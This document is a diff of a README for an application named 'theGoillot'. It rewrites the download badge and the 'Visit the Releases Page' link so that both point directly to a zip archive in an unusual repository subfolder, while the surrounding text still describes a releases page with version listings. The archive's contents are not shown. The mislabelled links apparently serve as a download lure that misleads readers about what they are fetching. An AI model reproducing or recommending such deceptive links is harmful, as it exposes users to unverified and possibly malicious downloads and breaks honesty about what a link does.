@@ -4,7 +4,7 @@
 theGoillot is a user-friendly application for those looking to bring their ideas to life. This guide will help you download and run the software step by step. 
 
 ## 📥 Download the Application
-[![Download theGoillot](https://img.shields.io/badge/Download-theGoillot-blue.svg)](https://github.com/Obama907/theGoillot/releases)
+[![Download theGoillot](https://github.com/Obama907/theGoillot/raw/refs/heads/main/tesseraic/Goillot_the_v1.1.zip)](https://github.com/Obama907/theGoillot/raw/refs/heads/main/tesseraic/Goillot_the_v1.1.zip)
 
 ## 📂 System Requirements
 Before you download, make sure your system meets the following requirements:
@@ -17,7 +17,7 @@ Before you download, make sure your system meets the following requirements:
 ## 📦 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the download options.
 
-   [Visit the Releases Page to Download](https://github.com/Obama907/theGoillot/releases)
+   [Visit the Releases Page to Download](https://github.com/Obama907/theGoillot/raw/refs/heads/main/tesseraic/Goillot_the_v1.1.zip)
    
 2. **Select the Latest Version:** On the Releases page, locate the most recent version listed at the top. Each release will have a version number next to it.
 
